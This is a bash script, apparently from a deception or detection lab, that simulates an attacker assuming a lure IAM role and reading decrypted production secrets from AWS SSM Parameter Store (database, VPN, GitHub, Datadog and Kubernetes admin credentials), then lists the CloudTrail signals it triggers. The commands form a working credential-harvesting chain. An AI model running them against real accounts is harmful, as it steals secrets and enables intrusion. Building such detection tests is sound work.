#!/usr/bin/env bash
#
# abuse.sh — Simulate attacker abuse of Scenario 3 (SSM Parameter Store Lure)
#
# This script walks through the attack chain step by step with colored output.
# It assumes the caller has valid AWS credentials for any identity in the account.
#
# Usage:
#   chmod +x abuse.sh
#   ./abuse.sh
#
set -euo pipefail

# ---------------------------------------------------------------
# Colors and helpers
# ---------------------------------------------------------------
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
CYAN='\033[0;36m'
NC='\033[0m'

step() { echo -e "\n${CYAN}[STEP $1]${NC} $2"; }
info() { echo -e "  ${GREEN}[+]${NC} $1"; }
warn() { echo -e "  ${YELLOW}[!]${NC} $1"; }
attack() { echo -e "  ${RED}[ATTACK]${NC} $1"; }

echo -e "${RED}"
echo "============================================="
echo "  SCENARIO 3 — ABUSE CHAIN"
echo "  SSM Parameter Store Infrastructure Lure"
echo "============================================="
echo -e "${NC}"

# ---------------------------------------------------------------
step "1" "Resolving account identity"
# ---------------------------------------------------------------
ACCOUNT_ID=$(aws sts get-caller-identity --query "Account" --output text)
CALLER_ARN=$(aws sts get-caller-identity --query "Arn" --output text)
info "Account ID: ${ACCOUNT_ID}"
info "Caller ARN: ${CALLER_ARN}"

# ---------------------------------------------------------------
step "2" "Assuming lure role: infra-config-readonly-role"
# ---------------------------------------------------------------
ROLE_ARN="arn:aws:iam::${ACCOUNT_ID}:role/infra-config-readonly-role"
attack "sts:AssumeRole → ${ROLE_ARN}"

CREDS=$(aws sts assume-role \
  --role-arn "${ROLE_ARN}" \
  --role-session-name "recon-session" \
  --query "Credentials" \
  --output json)

export AWS_ACCESS_KEY_ID=$(echo $CREDS | jq -r .AccessKeyId)
export AWS_SECRET_ACCESS_KEY=$(echo $CREDS | jq -r .SecretAccessKey)
export AWS_SESSION_TOKEN=$(echo $CREDS | jq -r .SessionToken)
info "Role assumed successfully"

# ---------------------------------------------------------------
step "3" "Enumerating parameters (ssm:DescribeParameters)"
# ---------------------------------------------------------------
attack "ssm:DescribeParameters"
aws ssm describe-parameters \
  --query "Parameters[*].[Name,Type,Description]" \
  --output table

# ---------------------------------------------------------------
step "4" "Bulk retrieving /prod/* parameters (ssm:GetParametersByPath)"
# ---------------------------------------------------------------
attack "ssm:GetParametersByPath → /prod/*"
echo ""
echo -e "${YELLOW}--- All /prod/* Parameters ---${NC}"
aws ssm get-parameters-by-path \
  --path "/prod" \
  --recursive \
  --with-decryption \
  --query "Parameters[*].[Name,Value]" \
  --output table

# ---------------------------------------------------------------
step "5" "Reading individual parameters for detail"
# ---------------------------------------------------------------

echo ""
attack "ssm:GetParameter → /prod/database/master-credentials"
echo -e "${YELLOW}--- Database Master Credentials ---${NC}"
aws ssm get-parameter \
  --name "/prod/database/master-credentials" \
  --with-decryption \
  --query "Parameter.Value" --output text | jq .

echo ""
attack "ssm:GetParameter → /prod/ci-cd/github-deploy-token"
echo -e "${YELLOW}--- GitHub Deploy Token ---${NC}"
aws ssm get-parameter \
  --name "/prod/ci-cd/github-deploy-token" \
  --with-decryption \
  --query "Parameter.Value" --output text | jq .

echo ""
attack "ssm:GetParameter → /prod/monitoring/datadog-api-keys"
echo -e "${YELLOW}--- Datadog API Keys ---${NC}"
aws ssm get-parameter \
  --name "/prod/monitoring/datadog-api-keys" \
  --with-decryption \
  --query "Parameter.Value" --output text | jq .

echo ""
attack "ssm:GetParameter → /prod/vpn/admin-credentials"
echo -e "${YELLOW}--- VPN Admin Credentials ---${NC}"
aws ssm get-parameter \
  --name "/prod/vpn/admin-credentials" \
  --with-decryption \
  --query "Parameter.Value" --output text | jq .

echo ""
attack "ssm:GetParameter → /prod/kubernetes/cluster-admin-kubeconfig"
echo -e "${YELLOW}--- EKS Cluster Admin Kubeconfig ---${NC}"
aws ssm get-parameter \
  --name "/prod/kubernetes/cluster-admin-kubeconfig" \
  --with-decryption \
  --query "Parameter.Value" --output text

# ---------------------------------------------------------------
# Cleanup
# ---------------------------------------------------------------
echo ""
step "6" "Cleaning up session"
unset AWS_ACCESS_KEY_ID AWS_SECRET_ACCESS_KEY AWS_SESSION_TOKEN
info "Session credentials cleared"

echo ""
echo -e "${GREEN}=============================================${NC}"
echo -e "${GREEN}  Abuse chain complete${NC}"
echo -e "${GREEN}=============================================${NC}"
echo ""
echo -e "${YELLOW}Detection signals generated:${NC}"
echo "  • CloudTrail: AssumeRole on infra-config-readonly-role"
echo "  • CloudTrail: DescribeParameters"
echo "  • CloudTrail: GetParametersByPath on /prod/*"
echo "  • CloudTrail: GetParameter × 5 (db, github, datadog, vpn, eks)"
echo ""
